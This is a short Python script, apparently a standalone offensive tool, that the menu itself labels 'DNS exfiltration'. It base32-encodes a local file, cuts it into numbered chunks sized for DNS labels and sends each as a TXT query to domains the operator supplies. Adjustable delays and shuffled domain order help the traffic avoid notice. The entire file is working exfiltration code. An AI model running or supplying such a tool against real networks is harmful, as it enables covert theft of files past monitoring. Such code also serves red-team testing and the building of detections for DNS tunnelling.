import base64
import pydig
import time
import random

def DataRecup(FileName):
    with open(FileName, 'r') as TargetData:
        content = TargetData.read()
        encoded = base64.b32encode(content.encode()).decode().rstrip("=")
    return encoded

def DividedInChunks(FileName='texte.txt'):
    data = DataRecup(FileName)
    chunks = []
    index = 0
    seq = 0

    while index < len(data):
        seq_str = str(seq)
        overhead = len(seq_str) + 1
        max_label_size = 63 - overhead

        chunk = data[index:index + max_label_size]
        label = f"{seq_str}_{chunk}"
        chunks.append(label)

        seq += 1
        index += max_label_size

    return chunks

def DnsRequest(DomainList, DelayBetweenRequests, RandomOrder):
    if RandomOrder:
        random.shuffle(DomainList)

    chunks = DividedInChunks()

    DomainCount = len(DomainList)

    for i, chunk in enumerate(chunks):
        DomainName = DomainList[i % DomainCount]
        full_domain = f"{chunk}.{DomainName}"
        print(full_domain)

        try:
            pydig.query(full_domain, 'TXT')
        except:
            pass

        time.sleep(DelayBetweenRequests)

def Menu():
    print("\n===== MENU =====")
    print("1. Define number of domain names")
    print("2. Define delay between DNS requests")
    print("3. Enable or disable random domain order")
    print("4. Start DNS exfiltration")
    print("5. Quit")

def main():
    DomainList = []
    DelayBetweenRequests = 0
    RandomOrder = False

    while True:
        Menu()
        choice = input("Choice: ")

        if choice == "1":
            nb = int(input("Number of domain names: "))
            DomainList = []
            for i in range(nb):
                d = input(f"Domain name #{i+1}: ")
                DomainList.append(d)

        elif choice == "2":
            DelayBetweenRequests = float(input("Delay between requests (seconds): "))

        elif choice == "3":
            opt = input("Random order (yes/no): ").lower()
            RandomOrder = (opt == "yes")

        elif choice == "4":
            if not DomainList:
                print("No domain names defined")
            else:
                print("Starting DNS exfiltration...")
                DnsRequest(DomainList, DelayBetweenRequests, RandomOrder)

        elif choice == "5":
            print("Exit")
            break

        else:
            print("Invalid choice")

if __name__ == "__main__":
    main()
